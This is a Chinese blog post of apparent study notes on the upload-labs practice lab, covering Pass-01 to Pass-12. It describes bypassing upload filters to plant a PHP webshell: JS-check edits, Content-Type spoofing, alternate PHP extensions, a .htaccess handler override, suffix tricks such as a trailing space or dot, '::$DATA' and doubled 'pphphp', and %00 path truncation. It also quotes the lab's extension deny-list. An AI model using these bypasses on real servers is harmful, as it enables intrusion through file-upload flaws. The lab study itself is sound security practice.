@@ -1,0 +1,1535 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Upload,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="upload-labs学习笔记 Pass-01-前端js校验传php，前端提示只能是jpg png gif类型  然后我burp没抓到包，估计前端就处理了 F12，看上传按钮绑定了checkFile函数  找到该函数，复制到console，修改为支持php  修改，回车  然后上传yijuhua.php，成功  蚁剑连接，over  Pass-02-后端检查Content-Typephp上传失败，">
+<meta name="keywords" content="Upload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs学习笔记">
+<meta property="og:url" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/index.html">
+<meta property="og:site_name" content="懵逼树树洞">
+<meta property="og:description" content="upload-labs学习笔记 Pass-01-前端js校验传php，前端提示只能是jpg png gif类型  然后我burp没抓到包，估计前端就处理了 F12，看上传按钮绑定了checkFile函数  找到该函数，复制到console，修改为支持php  修改，回车  然后上传yijuhua.php，成功  蚁剑连接，over  Pass-02-后端检查Content-Typephp上传失败，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191254418.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191411492.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191453257.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191515864.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191610025.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191659280.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118192206719.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118192438796.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118192609687.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118194431259.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118194407259.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118194505255.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118194533715.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118194607217.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118215458827.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118220008275.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118235613022.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119104152778.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119000742674.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119095646474.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119101933343.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119101839417.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119102335689.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119103057703.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119104651372.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119104706388.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119112048619.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119112013824.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119112305021.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119113312152.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119113546789.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119113820066.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119115054222.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119115223132.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119115333410.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119114930204.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119115038626.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119125853112.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119130028765.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119131508849.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119133721078.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119134937759.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119134957746.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119135133855.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119135730085.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119140104890.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119140220038.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119165443656.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210119165508627.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/get-0-post-1.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210120223241806.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/20190705134326-cf982650-9ee7-1.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/payload_1-phpinfo.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210121210722166.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/1-upload.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/payload-get-password-is-c.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/get-after-upload.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210121203513449.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/payload-post-password-is-c.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/post-after-upload.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133354221.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133736066.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133749429.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133832312.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133901237.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122133946066.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122134052422.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122180253314.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122180840449.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122181043307.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122180806081.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122181443209.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122181528157.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122181540979.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122192419835.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122192405106.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122192500262.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210122192559769.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123111436682.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123112208759.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123113636206.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123113706523.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/20190527142730-812f49fc-8048-1.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123113500745.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210123113513439.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/20190527142723-7cd5273c-8048-1.png">
+<meta property="og:updated_time" content="2021-11-18T03:43:24.764Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="upload-labs学习笔记">
+<meta name="twitter:description" content="upload-labs学习笔记 Pass-01-前端js校验传php，前端提示只能是jpg png gif类型  然后我burp没抓到包，估计前端就处理了 F12，看上传按钮绑定了checkFile函数  找到该函数，复制到console，修改为支持php  修改，回车  然后上传yijuhua.php，成功  蚁剑连接，over  Pass-02-后端检查Content-Typephp上传失败，">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/23/upload-labs学习笔记/image-20210118191254418.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/02/23/upload-labs学习笔记/">
+
+
+
+
+
+  <title>upload-labs学习笔记 | 懵逼树树洞</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">懵逼树树洞</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/23/upload-labs学习笔记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="oxygen-hunter">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/rabbit_true.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="懵逼树树洞">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">upload-labs学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-23T09:58:00+08:00">
+                2021-02-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration Test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读量：
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>upload-labs学习笔记</p>
+<h1 id="Pass-01-前端js校验"><a href="#Pass-01-前端js校验" class="headerlink" title="Pass-01-前端js校验"></a>Pass-01-前端js校验</h1><p>传php，前端提示只能是jpg png gif类型</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191254418.png" alt="image-20210118191254418"></p>
+<p>然后我burp没抓到包，估计前端就处理了</p>
+<p>F12，看上传按钮绑定了checkFile函数</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191411492.png" alt="image-20210118191411492"></p>
+<p>找到该函数，复制到console，修改为支持php</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191453257.png" alt="image-20210118191453257"></p>
+<p>修改，回车</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191515864.png" alt="image-20210118191515864"></p>
+<p>然后上传yijuhua.php，成功</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191610025.png" alt="image-20210118191610025"></p>
+<p>蚁剑连接，over</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191659280.png" alt="image-20210118191659280"></p>
+<h1 id="Pass-02-后端检查Content-Type"><a href="#Pass-02-后端检查Content-Type" class="headerlink" title="Pass-02-后端检查Content-Type"></a>Pass-02-后端检查Content-Type</h1><p>php上传失败，提示文件类型不符合，盲猜是Content-type的问题</p>
+<p>对比php和正常png</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192206719.png" alt="image-20210118192206719"></p>
+<p>修改php包的content-type</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192438796.png" alt="image-20210118192438796"></p>
+<p>看response包里的地址，../upload/yijuhua.php，上传成功了</p>
+<p>看下源码，果然</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192609687.png" alt="image-20210118192609687"></p>
+<h1 id="Pass-03-黑名单php3-phtml"><a href="#Pass-03-黑名单php3-phtml" class="headerlink" title="Pass-03-黑名单php3 phtml"></a>Pass-03-黑名单php3 phtml</h1><p>传php，提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</p>
+<p>看来是后端黑名单，试试看改成大写PHP或者大小写混合行不行——均不行，估计是后端验证程序扩展名，而且是小写化了的</p>
+<p>burp抓包.php后面加空格也不行</p>
+<p>用burp爆破.php扩展名，可以试试的有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php3</span><br><span class="line">php5</span><br><span class="line">phtml</span><br><span class="line">phs</span><br><span class="line">pht</span><br></pre></td></tr></table></figure>
+<p>php3解析成功</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194431259.png" alt="image-20210118194431259"></p>
+<p>php5未解析</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194407259.png" alt="image-20210118194407259"></p>
+<p>phtml解析成功</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194505255.png" alt="image-20210118194505255"></p>
+<p>phs未解析</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194533715.png" alt="image-20210118194533715"></p>
+<p>pht未解析</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194607217.png" alt="image-20210118194607217"></p>
+<p>看博客，通常只要试试php3和phtml即可</p>
+<p>看源码，还去掉了结尾空格，结尾点，扩展名大小写，::$DATA这4种绕过</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118215458827.png" alt="image-20210118215458827"></p>
+<p>稍等，yijuhua.php.aa可以吗</p>
+<p>可以上传，但是无法解析，会取扩展名aa，然后重命名</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118220008275.png" alt="image-20210118220008275"></p>
+<h1 id="Pass-04-黑名单-htaccess"><a href="#Pass-04-黑名单-htaccess" class="headerlink" title="Pass-04-黑名单.htaccess"></a>Pass-04-黑名单.htaccess</h1><p>php不行，png行，估计是后端白名单</p>
+<p>爆破下扩展名试试</p>
+<p>搞错了，还是黑名单，把php3，phtml也屏蔽了</p>
+<p>看博客说，上传一个.htaccess文件名的文件，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>这是个局部解析，然后就可以用图片马了，txt马也可以，都会解析为php</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118235613022.png" alt="image-20210118235613022"></p>
+<p>看源码，里面过滤了这么多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br></pre></td></tr></table></figure>
+<p>并且是把扩展名小写化了，过滤了PHP等变形</p>
+<p>补充，由于没有重命名，php.aa也可以</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104152778.png" alt="image-20210119104152778"></p>
+<h1 id="Pass-05-黑名单大小写绕过"><a href="#Pass-05-黑名单大小写绕过" class="headerlink" title="Pass-05-黑名单大小写绕过"></a>Pass-05-黑名单大小写绕过</h1><p>.htaccess也不能传了，png，txt可以传</p>
+<p>但意外的，PHP可以传了。。</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119000742674.png" alt="image-20210119000742674"></p>
+<p>看下源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119095646474.png" alt="image-20210119095646474"></p>
+<p>发现没有小写化，无法过滤PHP</p>
+<p>上传后会重命名文件，所以.user.ini不能生效，会被随机为xxx.ini</p>
+<h1 id="Pass-06-黑名单加空格"><a href="#Pass-06-黑名单加空格" class="headerlink" title="Pass-06-黑名单加空格"></a>Pass-06-黑名单加空格</h1><p>php，PHP，.htaccess不行</p>
+<p>由于会重命名，.user.ini也不行，php.aa也不行</p>
+<p>看04，05代码得知，遇到黑名单+重命名，还有这些方法</p>
+<ul>
+<li>后缀大小写</li>
+<li>后缀加.</li>
+<li>后缀加空格</li>
+<li>后缀加::$DATA</li>
+<li>（黑名单里收录的少就爆破后缀）</li>
+</ul>
+<p>其实都是php后缀，可以用intruder通杀一下，再加上一个.htaccess</p>
+<p>发现加空格的成功了</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119101933343.png" alt="image-20210119101933343"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119101839417.png" alt="image-20210119101839417"></p>
+<p>看源码发现没trim空格</p>
+<h1 id="Pass-07-黑名单apache解析漏洞"><a href="#Pass-07-黑名单apache解析漏洞" class="headerlink" title="Pass-07-黑名单apache解析漏洞"></a>Pass-07-黑名单apache解析漏洞</h1><p>php，PHP，htaccess不可以，txt可以，且没有重命名，想用.user.ini，能传，但没法解析，仔细看博客发现之前理解错了，首先得在这个目录下有一个php文件，才能利用.user.ini的包含把yijuhua.png包含进去</p>
+<p>php加点成功</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119102335689.png" alt="image-20210119102335689"></p>
+<p>php.aa也可以</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119103057703.png" alt="image-20210119103057703"></p>
+<h1 id="Pass-08-黑名单加-DATA"><a href="#Pass-08-黑名单加-DATA" class="headerlink" title="Pass-08-黑名单加::$DATA"></a>Pass-08-黑名单加::$DATA</h1><p>php等不行，会重命名，aa也不行</p>
+<p>::$DATA行，但要注意url访问时把::$DATA去掉</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104651372.png" alt="image-20210119104651372"></p>
+<p>否则会出现</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104706388.png" alt="image-20210119104706388"></p>
+<p>php .</p>
+<h1 id="Pass-09-黑名单后缀点空点"><a href="#Pass-09-黑名单后缀点空点" class="headerlink" title="Pass-09-黑名单后缀点空点 . ."></a>Pass-09-黑名单后缀点空点 . .</h1><p>被提示误导了，以为是白名单，然后传了个txt发现还是黑名单</p>
+<p>用.php. .         用.php .不行，看源码吧</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112048619.png" alt="image-20210119112048619"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112013824.png" alt="image-20210119112013824"></p>
+<p>看源码，他的思路是</p>
+<ol>
+<li>文件名去掉首尾空格</li>
+<li>文件名去掉末尾的点</li>
+<li>利用最后一个点的位置得到扩展名</li>
+<li>扩展名小写，去掉扩展名里的::$DATA</li>
+<li>首位去空格</li>
+</ol>
+<p>所以我们<code>yijuhua.php. .</code>      文件名是<code>yijuhua.php.空格</code>      扩展名是点空格</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112305021.png" alt="image-20210119112305021"></p>
+<h1 id="Pass-10-双写php绕过replace"><a href="#Pass-10-双写php绕过replace" class="headerlink" title="Pass-10-双写php绕过replace"></a>Pass-10-双写php绕过replace</h1><p>传php竟然成功，然后发现变成了</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113312152.png" alt="image-20210119113312152"></p>
+<p>看来是用了replace函数去掉了php</p>
+<p>双写绕过，yijuhua.pphphp</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113546789.png" alt="image-20210119113546789"></p>
+<p>看源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113820066.png" alt="image-20210119113820066"></p>
+<p>其中的str_ireplace(find, replace, string, count)，会把string中的find全部替换为replace，find时不区分大小写，如果区分的话使用str_replace函数</p>
+<h1 id="Pass-11-GET型-00"><a href="#Pass-11-GET型-00" class="headerlink" title="Pass-11-GET型%00"></a>Pass-11-GET型%00</h1><p>这次真的是白名单了</p>
+<p>发现在url里有说法</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115054222.png" alt=""></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115223132.png" alt="image-20210119115223132"></p>
+<p>看来会把文件校验后保存到save_path/file_name中去</p>
+<p>那么修改一下POST的url，让他截断</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115333410.png" alt="image-20210119115333410"></p>
+<p>传的后缀就用png，等会存到1.php里去</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119114930204.png" alt="image-20210119114930204"></p>
+<p>上传成功后发现src = /upload/1.php/xxx.png</p>
+<p>直接去找php，成功</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115038626.png" alt="image-20210119115038626"></p>
+<h1 id="Pass-12-POST型00截断save-path"><a href="#Pass-12-POST型00截断save-path" class="headerlink" title="Pass-12-POST型00截断save_path"></a>Pass-12-POST型00截断save_path</h1><p>还是白名单</p>
+<p>发了个正常包，然后看到save_path的值会发出去为../upload/</p>
+<p>那么考虑在这里hex00截断，改成../upload/3.php+，+替换成00</p>
+<p>同时把filename改成png扩展名</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119125853112.png" alt="image-20210119125853112"></p>
+<p>成功</p>
